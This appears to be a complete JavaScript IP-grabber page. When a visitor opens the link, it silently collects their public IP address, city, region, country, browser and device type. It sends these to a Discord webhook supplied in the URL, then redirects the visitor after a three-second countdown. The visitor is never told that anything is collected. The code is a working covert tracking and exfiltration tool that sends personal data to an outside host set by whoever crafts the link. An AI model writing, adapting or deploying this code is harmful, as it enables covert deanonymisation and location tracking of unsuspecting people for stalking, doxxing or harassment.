function getBrowserInfo() {
    const userAgent = window.navigator.userAgent;
    let browserInfo = "Unknown";

    if (userAgent.includes("Firefox")) {
        browserInfo = "Mozilla Firefox";
    } else if (userAgent.includes("Chrome")) {
        browserInfo = "Google Chrome";
    } else if (userAgent.includes("Safari")) {
        browserInfo = "Apple Safari";
    } else if (userAgent.includes("Edge")) {
        browserInfo = "Microsoft Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
        browserInfo = "Opera";
    } else if (userAgent.includes("Trident") || userAgent.includes("MSIE")) {
        browserInfo = "Internet Explorer";
    }

    return browserInfo;
}

function getDeviceInfo() {
    const deviceType = window.navigator.userAgent.match(/Mobile|Tablet|iPad|iPhone|Android|Windows Phone|Windows NT|BlackBerry|BB|PlayBook|Opera Mini|IEMobile|Kindle|Silk|webOS|Symbian|Meego|Nintendo|macintosh|Palm|PlayStation|Xbox|Nexus|CriOS|FxiOS|Tizen|Linux/i);
    return deviceType ? deviceType[0] : "Unknown";
}

function sendToDiscord(message, webhookUrl) {
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ content: message })
    })
    .then(response => {
      if (response.ok) {
        console.log('Message sent to Discord successfully.');
      } else {
        console.error('Failed to send message to Discord:', response.status, response.statusText);
      }
    })
    .catch(error => {
      console.error('Error sending message to Discord:', error);
    });
  }
  
  document.addEventListener("DOMContentLoaded", function() {
    // Perform actions automatically when the page loads
  
    // Get the Discord webhook URL and the desired page URL from the URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const webhookUrl = urlParams.get('webhook');
    const desiredPageUrl = urlParams.get('redirect');
  
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ipAddress = "Your IP Address: " + data.ip;
        return fetch("https://ip-api.com/json/" + data.ip)
          .then(response => response.json())
          .then(locationData => {
            const location = "Location: " + locationData.city + ", " + locationData.regionName + ", " + locationData.country;
            const browser = "Browser: " + getBrowserInfo();
            const device = "Device: " + getDeviceInfo();
  
            const message = `${ipAddress}\n${location}\n${browser}\n${device}`;
            sendToDiscord(message, webhookUrl);
  
            // Start the 3-second countdown timer
            let secondsLeft = 3;
            const countdownElement = document.createElement("div");
            countdownElement.innerText = `Redirecting in ${secondsLeft} seconds...`;
            document.body.appendChild(countdownElement);
  
            const countdownInterval = setInterval(() => {
              secondsLeft--;
              countdownElement.innerText = `Redirecting in ${secondsLeft} seconds...`;
              if (secondsLeft === 0) {
                clearInterval(countdownInterval);
                // Redirect to the desired page after completing the countdown
                window.location.href = desiredPageUrl;
              }
            }, 1000);
          });
      })
      .catch(error => {
        console.error('Error fetching IP address or location:', error);
      });
  });